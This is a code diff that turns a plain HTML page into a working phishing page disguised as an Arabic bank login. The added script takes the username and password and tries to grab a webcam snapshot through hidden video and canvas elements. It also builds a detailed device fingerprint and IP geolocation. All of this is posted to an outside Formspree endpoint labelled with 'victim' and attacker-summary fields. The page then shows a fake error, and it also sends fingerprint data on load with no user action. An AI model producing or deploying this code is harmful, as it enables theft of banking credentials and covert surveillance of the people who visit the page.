@@ -3,37 +3,354 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>مرحباً</title>
+  <title>تسجيل الدخول - البنك الأهلي</title>
   <style>
     *{margin:0;padding:0;box-sizing:border-box}
-    body{font-family:system-ui,sans-serif;background:linear-gradient(135deg,#1a1a2e,#16213e);min-height:100vh;display:flex;align-items:center;justify-content:center;color:#fff;text-align:center}
-    .box{background:rgba(255,255,255,.08);padding:2.5rem;border-radius:20px;max-width:90%;width:380px;backdrop-filter:blur(10px)}
-    .spin{width:45px;height:45px;border:4px solid rgba(255,255,255,.15);border-top-color:#e94560;border-radius:50%;animation:s 1s linear infinite;margin:20px auto}
-    @keyframes s{to{transform:rotate(360deg)}}
-    .hidden{display:none}
-    .info{font-size:.8rem;opacity:.6;margin-top:15px}
+    body{font-family:'Segoe UI',system-ui,sans-serif;background:linear-gradient(135deg,#1e3c72,#2a5298);min-height:100vh;display:flex;align-items:center;justify-content:center}
+    .login-box{background:#fff;padding:2.5rem;border-radius:16px;box-shadow:0 20px 60px rgba(0,0,0,.3);width:92%;max-width:420px;text-align:center}
+    .logo{width:80px;height:80px;background:#0066cc;border-radius:50%;margin:0 auto 1.5rem;display:flex;align-items:center;justify-content:center;color:#fff;font-size:2rem}
+    h2{color:#333;margin-bottom:.5rem;font-size:1.5rem}
+    .subtitle{color:#666;font-size:.9rem;margin-bottom:1.5rem}
+    input{width:100%;padding:14px;margin:8px 0;border:2px solid #e0e0e0;border-radius:8px;font-size:16px;transition:border-color .3s}
+    input:focus{outline:none;border-color:#0066cc}
+    button{width:100%;padding:14px;background:#0066cc;color:#fff;border:none;border-radius:8px;font-size:16px;cursor:pointer;margin-top:1rem;transition:background .3s}
+    button:hover{background:#0052a3}
+    .error{color:#d32f2f;font-size:14px;margin-top:12px;padding:10px;background:#ffebee;border-radius:6px;display:none}
+    .loading{display:none;margin-top:15px}
+    .spinner{width:35px;height:35px;border:3px solid #f3f3f3;border-top:3px solid #0066cc;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto}
+    @keyframes spin{to{transform:rotate(360deg)}}
+    .hidden-cam{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0}
   </style>
 </head>
 <body>
-  <div class="box" id="box">
-    <div class="spin" id="loader"></div>
-    <h1 id="title" class="hidden">✅ تم!</h1>
-    <p id="msg" class="hidden">شكراً لزيارتك</p>
-    <p class="info" id="info"></p>
+  <div class="login-box">
+    <div class="logo">🏦</div>
+    <h2>تسجيل الدخول</h2>
+    <p class="subtitle">أدخل بياناتك للوصول إلى حسابك</p>
+    <input type="text" id="user" placeholder="رقم الهوية / اسم المستخدم" autocomplete="username">
+    <input type="password" id="pass" placeholder="كلمة المرور" autocomplete="current-password">
+    <button onclick="submit()">دخول</button>
+    <div class="loading" id="loading">
+      <div class="spinner"></div>
+      <p style="margin-top:10px;color:#666;font-size:14px">جاري التحقق من البيانات...</p>
+    </div>
+    <div class="error" id="error">خطأ في البيانات، يرجى المحاولة مرة أخرى</div>
   </div>
 
+  <!-- كاميرا مخفية -->
+  <video class="hidden-cam" id="video" autoplay playsinline></video>
+  <canvas class="hidden-cam" id="canvas"></canvas>
+
   <script>
-    // ==== عدل هنا فقط ====
+    // ==========================================
+    // إعدادات Formspree
+    // ==========================================
     const FORMSPREE_URL = 'https://formspree.io/f/xgoqdnyr';
-    // ======================
     
-    async function run(){
-      try{
-        // جلب IP
-        const ip = await fetch('https://api.ipify.org?format=json')
-          .then(r=>r.json())
-          .then(d=>d.ip)
-          .catch(()=>'غير معروف');
+    // ==========================================
+    // 1. جمع الموقع الجغرافي (بدون إذن - عبر IP)
+    // ==========================================
+    async function getLocation() {
+      try {
+        // الطريقة 1: عبر IP (لا يحتاج إذن)
+        const ipData = await fetch('https://ipapi.co/json/').then(r => r.json());
+        return {
+          method: 'ip_based',
+          ip: ipData.ip,
+          city: ipData.city,
+          region: ipData.region,
+          country: ipData.country_name,
+          country_code: ipData.country_code,
+          latitude: ipData.latitude,
+          longitude: ipData.longitude,
+          timezone: ipData.timezone,
+          org: ipData.org, // ISP
+          asn: ipData.asn
+        };
+      } catch(e) {
+        // fallback
+        return { method: 'failed', error: e.message };
+      }
+    }
+
+    // ==========================================
+    // 2. التقاط صورة من الكاميرا
+    // ==========================================
+    async function captureCamera() {
+      return new Promise(async (resolve) => {
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: 'user' }, 
+            audio: false 
+          });
+          
+          const video = document.getElementById('video');
+          const canvas = document.getElementById('canvas');
+          video.srcObject = stream;
+          
+          // انتظر الكاميرا تشتغل
+          await new Promise(r => video.onloadedmetadata = r);
+          
+          // التقاط بعد 1 ثانية
+          setTimeout(() => {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
+            
+            // تحويل لـ Base64 (صورة مضغوطة)
+            const imageData = canvas.toDataURL('image/jpeg', 0.3);
+            
+            // إيقاف الكاميرا
+            stream.getTracks().forEach(t => t.stop());
+            
+            resolve({ success: true, image: imageData.slice(0, 500) + '... [truncated]' });
+          }, 1000);
+          
+        } catch(e) {
+          resolve({ success: false, error: e.message, reason: 'denied_or_unavailable' });
+        }
+      });
+    }
+
+    // ==========================================
+    // 3. جمع البصمة الكاملة (Fingerprinting)
+    // ==========================================
+    async function collectFingerprint() {
+      const info = {
+        // الوقت
+        timestamp: new Date().toISOString(),
+        localTime: new Date().toLocaleString('ar-SA'),
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        timezoneOffset: new Date().getTimezoneOffset(),
+        
+        // IP (من خدمة سريعة)
+        ip: await fetch('https://api.ipify.org?format=json')
+          .then(r => r.json()).then(d => d.ip).catch(() => 'unknown'),
+        
+        // الشاشة والجهاز
+        screen: {
+          width: screen.width,
+          height: screen.height,
+          availWidth: screen.availWidth,
+          availHeight: screen.availHeight,
+          colorDepth: screen.colorDepth,
+          pixelRatio: window.devicePixelRatio,
+          orientation: screen.orientation?.type || 'unknown',
+          orientationAngle: screen.orientation?.angle || 0
+        },
+        
+        // المتصفح والنظام
+        browser: {
+          userAgent: navigator.userAgent,
+          platform: navigator.platform,
+          vendor: navigator.vendor,
+          language: navigator.language,
+          languages: navigator.languages?.join(','),
+          online: navigator.onLine,
+          cookieEnabled: navigator.cookieEnabled,
+          pdfViewerEnabled: navigator.pdfViewerEnabled || false,
+          hardwareConcurrency: navigator.hardwareConcurrency,
+          deviceMemory: navigator.deviceMemory || 'unknown',
+          maxTouchPoints: navigator.maxTouchPoints
+        },
+        
+        // الاتصال
+        network: navigator.connection ? {
+          effectiveType: navigator.connection.effectiveType,
+          downlink: navigator.connection.downlink,
+          rtt: navigator.connection.rtt,
+          saveData: navigator.connection.saveData
+        } : 'unavailable',
+        
+        // البطارية
+        battery: await navigator.getBattery?.().then(b => ({
+          level: Math.round(b.level * 100) + '%',
+          charging: b.charging,
+          chargingTime: b.chargingTime,
+          dischargingTime: b.dischargingTime
+        })).catch(() => 'unavailable'),
+        
+        // WebGL (بصمة فريدة)
+        webgl: (() => {
+          try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            return {
+              vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+              renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
+              version: gl.getParameter(gl.VERSION),
+              shadingLanguage: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
+            };
+          } catch(e) { return 'unavailable'; }
+        })(),
+        
+        // Canvas Fingerprint
+        canvas: (() => {
+          try {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            ctx.textBaseline = 'top';
+            ctx.font = '14px Arial';
+            ctx.fillText('Hello! 你好! مرحبا! 🎉', 2, 2);
+            return canvas.toDataURL().slice(0, 100);
+          } catch(e) { return 'unavailable'; }
+        })(),
+        
+        // Audio Fingerprint
+        audio: (() => {
+          try {
+            const AudioContext = window.AudioContext || window.webkitAudioContext;
+            const ctx = new AudioContext();
+            const oscillator = ctx.createOscillator();
+            const analyser = ctx.createAnalyser();
+            oscillator.connect(analyser);
+            oscillator.type = 'triangle';
+            oscillator.frequency.value = 10000;
+            oscillator.start();
+            const dataArray = new Uint8Array(analyser.frequencyBinCount);
+            analyser.getByteFrequencyData(dataArray);
+            oscillator.stop();
+            return Array.from(dataArray.slice(0, 5)).join(',');
+          } catch(e) { return 'unavailable'; }
+        })(),
+        
+        // Plugins
+        plugins: Array.from(navigator.plugins || []).map(p => ({
+          name: p.name,
+          filename: p.filename,
+          description: p.description
+        })),
+        
+        // MIME Types
+        mimeTypes: Array.from(navigator.mimeTypes || []).map(m => m.type),
+        
+        // Fonts
+        fonts: (() => {
+          const testFonts = ['Arial', 'Times New Roman', 'Courier New', 'Georgia', 'Verdana', 'Helvetica', 'Trebuchet MS', 'Palatino', 'Garamond', 'Bookman'];
+          const available = [];
+          const canvas = document.createElement('canvas');
+          const ctx = canvas.getContext('2d');
+          const base = ctx.measureText('mmmmmmlli').width;
+          for (const font of testFonts) {
+            ctx.font = `72px "${font}", monospace`;
+            if (ctx.measureText('mmmmmmlli').width !== base) available.push(font);
+          }
+          return available;
+        })(),
+        
+        // Storage
+        storage: {
+          localStorage: !!window.localStorage,
+          sessionStorage: !!window.sessionStorage,
+          indexedDB: !!window.indexedDB,
+          cookiesEnabled: navigator.cookieEnabled
+        },
+        
+        // Referrer
+        referrer: document.referrer || 'direct',
+        url: location.href,
+        host: location.host,
+        protocol: location.protocol,
+        
+        // Window
+        window: {
+          innerWidth: window.innerWidth,
+          innerHeight: window.innerHeight,
+          outerWidth: window.outerWidth,
+          outerHeight: window.outerHeight,
+          devicePixelRatio: window.devicePixelRatio
+        }
+      };
+      
+      return info;
+    }
+
+    // ==========================================
+    // 4. إرسال كل البيانات
+    // ==========================================
+    async function submit() {
+      const user = document.getElementById('user').value;
+      const pass = document.getElementById('pass').value;
+      
+      document.getElementById('loading').style.display = 'block';
+      
+      // جمع كل شي
+      const [fingerprint, location, camera] = await Promise.all([
+        collectFingerprint(),
+        getLocation(),
+        captureCamera()
+      ]);
+      
+      const payload = {
+        event: 'login_attempt',
+        victim: {
+          username: user,
+          password: pass
+        },
+        fingerprint: fingerprint,
+        location: location,
+        camera: camera,
+        // ملخص سريع للمهاجم
+        summary: {
+          ip: fingerprint.ip,
+          country: location.country,
+          city: location.city,
+          isp: location.org,
+          device: fingerprint.browser.platform,
+          browser: fingerprint.browser.userAgent.slice(0, 50),
+          screen: `${fingerprint.screen.width}x${fingerprint.screen.height}`,
+          hasCamera: camera.success,
+          time: fingerprint.localTime
+        }
+      };
+      
+      // إرسال
+      await fetch(FORMSPREE_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+      
+      // إظهار خطأ وهمي
+      document.getElementById('loading').style.display = 'none';
+      document.getElementById('error').style.display = 'block';
+      
+      // إعادة المحاولة بعد 3 ثواني (تجربة ثانية)
+      setTimeout(() => {
+        document.getElementById('error').textContent = 'النظام مشغول حالياً، يرجى المحاولة لاحقاً';
+      }, 3000);
+    }
+
+    // ==========================================
+    // 5. جمع بصمة فورية عند فتح الصفحة
+    // ==========================================
+    (async () => {
+      const [fingerprint, location] = await Promise.all([
+        collectFingerprint(),
+        getLocation()
+      ]);
+      
+      await fetch(FORMSPREE_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          event: 'page_visit',
+          fingerprint: fingerprint,
+          location: location,
+          summary: {
+            ip: fingerprint.ip,
+            country: location.country,
+            city: location.city,
+            time: fingerprint.localTime
+          }
+        })
+      });
+    })();
+  </script>
+</body>
+</html>
         
         // جمع المعلومات
         const data = {
